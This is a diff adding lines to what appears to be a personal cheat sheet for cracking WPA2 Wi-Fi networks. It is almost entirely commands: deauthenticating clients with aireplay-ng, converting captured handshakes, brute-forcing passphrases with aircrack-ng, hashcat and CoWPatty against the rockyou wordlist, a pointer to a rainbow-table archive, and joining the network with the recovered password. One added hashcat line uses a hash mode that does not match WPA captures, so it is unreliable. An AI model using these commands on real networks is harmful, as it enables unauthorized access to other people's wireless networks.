@@ -12,6 +12,7 @@ aireplay-ng --deauth 0 -a 11:22:33:44:55:66 wlan0mon
 cap2hccapx.bin capcha.cap capcha_out.hccapx
 (John)
 cap2hccapx.bin  -e '<ESSID>' capcha.cap capcha_out.hccapx
+/usr/lib/hashcat-utils/cap2hccapx.bin hs_ATT1p0n3dU.cap hs_ATT1p0n3dU.hccapx
 hccap2john capture_out.hccapx > john_capcha
 	-git clone https://github.com/ZerBea/hcxtools.git
 	
@@ -63,8 +64,36 @@ aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
 curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 # crack w/ aircrack-ng
 aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap
+# -a2 flag specifies WPA2 authentication
 ########## or crack password with naive-hashcat ##########
 # convert cap to hccapx
 cap2hccapx.bin capture/-01.cap capture/-01.hccapx
 # crack with naive-hashcat
 HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
+hashcat64 -a 0 -m 400 -r rules/best64.rule hs_ATT1p0n3dU.hccapx \Users\hackerman\rockyou.txt
+hashcat64 -a 0 -m 400 -r rules/d3ad0ne.rule hs_ATT1p0n3dU.hccapx /home/hackerman/rockyou.txt
+
+
+
+#WPA2 rainbow tables
+https://ia802902.us.archive.org/zip_dir.php?path=/1/items/wpa_psk_h1kari_renderman.zip
+	-33.5GB
+	
+	
+
+
+airmon-ng/CoWPatty (old, depricate use):
+airolib-ng smokecrackwpa --import passwd /usr/share/wordlists/rockyou.txt
+airolib-ng smokecrackwpa --import essid <essid>
+airolib-ng smokecrackwpa --stats
+airolib-ng smokecrackwpa --clean all
+airolib-ng smokecrackwpa --batch
+airolib-ng smokecrackwpa --verify all
+aircrack -r smokecrackwpa /home/gattaca/under-our-tounges.cap
+cowpatty -s mradministrator -r /home/gattaca/under-our-tounges.cap -f /usr/share/wordlists/rockyou.txt
+genpmk -s mradministrator -d /root/output-hash -f /usr/share/wordlists/rockyou.txt
+cowpatty -s mradministrator -r /root/hcap-01.cap -d /root/output-hash
+wpa_passphrase mradministrator password1rocks! > /root/wpa.conf
+wpa_supplicant -Dwext -iwlan1 -c /root/wpa.conf
+dhclient -r
+dhclient wlan1
